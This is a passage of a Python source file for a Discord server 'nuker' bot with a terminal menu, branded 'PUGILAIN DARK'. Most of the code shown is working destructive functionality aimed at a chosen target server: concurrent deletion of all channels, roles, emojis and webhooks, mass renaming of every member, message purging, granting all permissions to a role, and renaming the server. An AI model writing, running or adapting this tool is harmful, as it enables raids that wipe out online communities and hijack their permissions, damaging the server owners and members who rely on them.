        cprint("[!] Cannot disable community mode")
    await asyncio.sleep(0.3)

async def purge(amount):
    if not bot.target_guild:
        cprint("[!] No target selected")
        await asyncio.sleep(1)
        await select_server()
        return
    
    try:
        channel_id = input(f"{R}{BD}[?] Channel ID (empty for first): {RT}")
        if channel_id:
            channel = bot.target_guild.get_channel(int(channel_id))
        else:
            channel = bot.target_guild.text_channels[0] if bot.target_guild.text_channels else None
        
        if channel and isinstance(channel, discord.TextChannel):
            deleted = await channel.purge(limit=amount)
            cprint(f"[✓] {len(deleted)} messages deleted")
        else:
            cprint("[!] Channel not found")
    except:
        cprint("[!] Error purging messages")
    await asyncio.sleep(0.3)

async def show_bans():
    if not bot.target_guild:
        cprint("[!] No target selected")
        await asyncio.sleep(1)
        await select_server()
        return
    
    cprint("[!] Ban list:")
    try:
        async for entry in bot.target_guild.bans():
            cprint(f"  - {entry.user.name} (ID: {entry.user.id})")
    except:
        cprint("[!] Cannot fetch bans")
    input(f"{R}{BD}[?] Press enter to continue...{RT}")

async def show_cats():
    if not bot.target_guild:
        cprint("[!] No target selected")
        await asyncio.sleep(1)
        await select_server()
        return
    
    cprint("[!] Categories:")
    for c in bot.target_guild.categories:
        cprint(f"  - {c.name}")
    input(f"{R}{BD}[?] Press enter to continue...{RT}")

async def show_emojis():
    if not bot.target_guild:
        cprint("[!] No target selected")
        await asyncio.sleep(1)
        await select_server()
        return
    
    cprint("[!] Emojis:")
    for e in bot.target_guild.emojis:
        cprint(f"  - {e.name} (ID: {e.id})")
    input(f"{R}{BD}[?] Press enter to continue...{RT}")

async def show_voice():
    if not bot.target_guild:
        cprint("[!] No target selected")
        await asyncio.sleep(1)
        await select_server()
        return
    
    cprint("[!] Voice channels:")
    for c in bot.target_guild.voice_channels:
        cprint(f"  - {c.name}")
    input(f"{R}{BD}[?] Press enter to continue...{RT}")

async def bot_config():
    if not bot.target_guild:
        cprint("[!] No target selected")
        await asyncio.sleep(1)
        await select_server()
        return
    
    cprint(f"Bot: {bot.user.name}")
    cprint(f"ID: {bot.user.id}")
    cprint(f"Target: {bot.target_guild.name}")
    cprint(f"Commands: {len(bot.commands)}")
    input(f"{R}{BD}[?] Press enter to continue...{RT}")

async def create_cat(name):
    if not bot.target_guild:
        cprint("[!] No target selected")
        await asyncio.sleep(1)
        await select_server()
        return
    
    try:
        category = await bot.target_guild.create_category(name)
        cprint(f"[✓] Category created: {category.name}")
    except:
        cprint("[!] Error creating category")
    await asyncio.sleep(0.3)

async def create_vc(name):
    if not bot.target_guild:
        cprint("[!] No target selected")
        await asyncio.sleep(1)
        await select_server()
        return
    
    try:
        channel = await bot.target_guild.create_voice_channel(name)
        cprint(f"[✓] Voice channel created: {channel.name}")
    except:
        cprint("[!] Error creating voice channel")
    await asyncio.sleep(0.3)

async def create_ch(name):
    if not bot.target_guild:
        cprint("[!] No target selected")
        await asyncio.sleep(1)
        await select_server()
        return
    
    try:
        channel = await bot.target_guild.create_text_channel(name)
        cprint(f"[✓] Channel created: {channel.name}")
    except:
        cprint("[!] Error creating channel")
    await asyncio.sleep(0.3)

async def del_all_cc():
    if not bot.target_guild:
        cprint("[!] No target selected")
        await asyncio.sleep(1)
        await select_server()
        return
    
    cprint("[!] Deleting channels and categories...")
    tasks = [channel.delete() for channel in bot.target_guild.channels]
    await asyncio.gather(*tasks, return_exceptions=True)
    cprint("[✓] Deleted")
    await asyncio.sleep(0.3)

async def role_to(member_id, role_id):
    if not bot.target_guild:
        cprint("[!] No target selected")
        await asyncio.sleep(1)
        await select_server()
        return
    
    try:
        member = bot.target_guild.get_member(int(member_id))
        role = bot.target_guild.get_role(int(role_id))
        if member and role:
            await member.add_roles(role)
            cprint("[✓] Role added")
        else:
            cprint("[!] Member or role not found")
    except:
        cprint("[!] Invalid input")
    await asyncio.sleep(0.3)

async def move_role_pos(role_id, pos):
    if not bot.target_guild:
        cprint("[!] No target selected")
        await asyncio.sleep(1)
        await select_server()
        return
    
    try:
        role = bot.target_guild.get_role(int(role_id))
        if role:
            await role.edit(position=int(pos))
            cprint("[✓] Role moved")
        else:
            cprint("[!] Role not found")
    except:
        cprint("[!] Invalid input")
    await asyncio.sleep(0.3)

async def auto_nick(nick):
    if not bot.target_guild:
        cprint("[!] No target selected")
        await asyncio.sleep(1)
        await select_server()
        return
    
    cprint("[!] Auto nickname change...")
    tasks = [member.edit(nick=nick) for member in bot.target_guild.members]
    await asyncio.gather(*tasks, return_exceptions=True)
    cprint("[✓] Completed")
    await asyncio.sleep(0.3)

async def auto_status(status):
    await bot_status(status)

async def change_status(status):
    try:
        await bot.change_presence(activity=discord.Game(name=status))
        cprint(f"[✓] Status: {status}")
    except:
        cprint("[!] Error changing status")
    await asyncio.sleep(0.3)

async def change_server_name(name):
    if not bot.target_guild:
        cprint("[!] No target selected")
        await asyncio.sleep(1)
        await select_server()
        return
    
    try:
        await bot.target_guild.edit(name=name)
        cprint(f"[✓] Name changed to: {name}")
    except:
        cprint("[!] Error changing name")
    await asyncio.sleep(0.3)

async def change_server_icon():
    if not bot.target_guild:
        cprint("[!] No target selected")
        await asyncio.sleep(1)
        await select_server()
        return
    
    icon_path = input(f"{R}{BD}[?] Icon image path: {RT}")
    if os.path.exists(icon_path):
        try:
            with open(icon_path, 'rb') as f:
                icon_data = f.read()
            await bot.target_guild.edit(icon=icon_data)
            cprint("[✓] Icon changed")
        except:
            cprint("[!] Error changing icon")
    else:
        cprint("[!] File not found")
    await asyncio.sleep(0.3)

async def create_role():
    if not bot.target_guild:
        cprint("[!] No target selected")
        await asyncio.sleep(1)
        await select_server()
        return
    
    try:
        role = await bot.target_guild.create_role(name="PUGILAIN DARK MEMBERS")
        cprint(f"[✓] Role created: {role.name}")
    except:
        cprint("[!] Error creating role")
    await asyncio.sleep(0.3)

async def mass_nickname(nick):
    if not bot.target_guild:
        cprint("[!] No target selected")
        await asyncio.sleep(1)
        await select_server()
        return
    
    cprint("[!] Changing nicknames...")
    tasks = []
    for member in bot.target_guild.members:
        if nick:
            tasks.append(member.edit(nick=nick))
        else:
            tasks.append(member.edit(nick="PUGILAIN DARK"))
    await asyncio.gather(*tasks, return_exceptions=True)
    cprint("[✓] Nicknames changed")
    await asyncio.sleep(0.3)

async def delete_emojis():
    if not bot.target_guild:
        cprint("[!] No target selected")
        await asyncio.sleep(1)
        await select_server()
        return
    
    cprint("[!] Deleting emojis...")
    tasks = [emoji.delete() for emoji in bot.target_guild.emojis]
    await asyncio.gather(*tasks, return_exceptions=True)
    cprint("[✓] Emojis deleted")
    await asyncio.sleep(0.3)

async def delete_webhooks():
    if not bot.target_guild:
        cprint("[!] No target selected")
        await asyncio.sleep(1)
        await select_server()
        return
    
    cprint("[!] Deleting webhooks...")
    tasks = []
    for channel in bot.target_guild.text_channels:
        try:
            webhooks = await channel.webhooks()
            for webhook in webhooks:
                tasks.append(webhook.delete())
        except:
            pass
    await asyncio.gather(*tasks, return_exceptions=True)
    cprint("[✓] Webhooks deleted")
    await asyncio.sleep(0.3)

async def leave_server():
    if not bot.target_guild:
        cprint("[!] No target selected")
        await asyncio.sleep(1)
        await select_server()
        return
    
    cprint(f"[!] Leaving {bot.target_guild.name}...")
    try:
        await bot.target_guild.leave()
        cprint("[✓] Left the server")
    except:
        cprint("[!] Error leaving server")
    await asyncio.sleep(1)
    await select_server()

async def show_server_info():
    if not bot.target_guild:
        cprint("[!] No target selected")
        await asyncio.sleep(1)
        await select_server()
        return
    
    cprint(f"Name: {bot.target_guild.name}")
    cprint(f"ID: {bot.target_guild.id}")
    cprint(f"Owner: {bot.target_guild.owner}")
    cprint(f"Members: {len(bot.target_guild.members)}")
    cprint(f"Channels: {len(bot.target_guild.channels)}")
    cprint(f"Roles: {len(bot.target_guild.roles)}")
    cprint(f"Emojis: {len(bot.target_guild.emojis)}")
    cprint(f"Created: {bot.target_guild.created_at.strftime('%Y-%m-%d')}")
    input(f"{R}{BD}[?] Press enter to continue...{RT}")

async def show_channels():
    if not bot.target_guild:
        cprint("[!] No target selected")
        await asyncio.sleep(1)
        await select_server()
        return
    
    cprint("[!] Channels:")
    for c in bot.target_guild.channels:
        cprint(f"  - {c.name}")
    input(f"{R}{BD}[?] Press enter to continue...{RT}")

async def show_roles():
    if not bot.target_guild:
        cprint("[!] No target selected")
        await asyncio.sleep(1)
        await select_server()
        return
    
    cprint("[!] Roles:")
    for r in bot.target_guild.roles:
        cprint(f"  - {r.name}")
    input(f"{R}{BD}[?] Press enter to continue...{RT}")

async def show_members():
    if not bot.target_guild:
        cprint("[!] No target selected")
        await asyncio.sleep(1)
        await select_server()
        return
    
    cprint("[!] Members:")
    for m in bot.target_guild.members:
        cprint(f"  - {m.name}")
    input(f"{R}{BD}[?] Press enter to continue...{RT}")

async def show_link():
    cprint("[✓] Link: https://discord.gg/pugilain")
    input(f"{R}{BD}[?] Press enter to continue...{RT}")

async def check_role_permissions(role_id):
    if not bot.target_guild:
        cprint("[!] No target selected")
        await asyncio.sleep(1)
        await select_server()
        return
    
    try:
        role = bot.target_guild.get_role(int(role_id))
        if role:
            perms = role.permissions
            dangerous = []
            if perms.administrator:
                dangerous.append("Administrator")
            if perms.manage_guild:
                dangerous.append("Manage Guild")
            if perms.ban_members:
                dangerous.append("Ban Members")
            if perms.kick_members:
                dangerous.append("Kick Members")
            if perms.manage_channels:
                dangerous.append("Manage Channels")
            if perms.manage_roles:
                dangerous.append("Manage Roles")
            if perms.manage_webhooks:
                dangerous.append("Manage Webhooks")
            if perms.mention_everyone:
                dangerous.append("Mention Everyone")
            
            if dangerous:
                cprint(f"[!] Dangerous permissions of {role.name}:")
                for perm in dangerous:
                    cprint(f"  - {perm}")
            else:
                cprint(f"[✓] {role.name} has no dangerous permissions")
            input(f"{R}{BD}[?] Press enter to continue...{RT}")
        else:
            cprint("[!] Role not found")
            await asyncio.sleep(0.3)
    except:
        cprint("[!] Invalid role ID")
        await asyncio.sleep(0.3)

async def grant_all_permissions(role_id):
    if not bot.target_guild:
        cprint("[!] No target selected")
        await asyncio.sleep(1)
        await select_server()
        return
    
    try:
        role = bot.target_guild.get_role(int(role_id))
        if role:
            perms = discord.Permissions.all()
            await role.edit(permissions=perms)
            cprint(f"[✓] Max permissions granted to: {role.name}")
        else:
            cprint("[!] Role not found")
    except:
        cprint("[!] Invalid role ID")
    await asyncio.sleep(0.3)

async def del_all_roles():
    if not bot.target_guild:
        cprint("[!] No target selected")
        await asyncio.sleep(1)
        await select_server()
        return
    
    cprint("[!] Deleting all roles...")
    tasks = [role.delete() for role in bot.target_guild.roles if role.name != "@everyone"]
    await asyncio.gather(*tasks, return_exceptions=True)
    cprint("[✓] Roles deleted")
    await asyncio.sleep(0.3)

async def del_all():
    if not bot.target_guild:
        cprint("[!] No target selected")
        await asyncio.sleep(1)
        await select_server()
        return
    
    cprint("[!] DELETE ALL - Flash deletion...")
    
    tasks = [channel.delete() for channel in bot.target_guild.channels]
    tasks += [role.delete() for role in bot.target_guild.roles if role.name != "@everyone"]
    tasks += [emoji.delete() for emoji in bot.target_guild.emojis]
    
    await asyncio.gather(*tasks, return_exceptions=True)
    cprint("[✓] DELETE ALL completed!")
    await asyncio.sleep(0.3)

async def refresh():
    cprint("[✓] Refresh completed!")
    await asyncio.sleep(0.3)

if __name__ == "__main__":
    loading_bar()
    while True:
        token = get_token()
        try:
            bot.run(token)
        except discord.LoginFailure:
            cprint("[!] Invalid token")
            cprint("[!] Please check your token and try again")
            time.sleep(2)
            clear()
        except Exception as e:
            cprint(f"[!] Error: {e}")
            time.sleep(2)
            clear()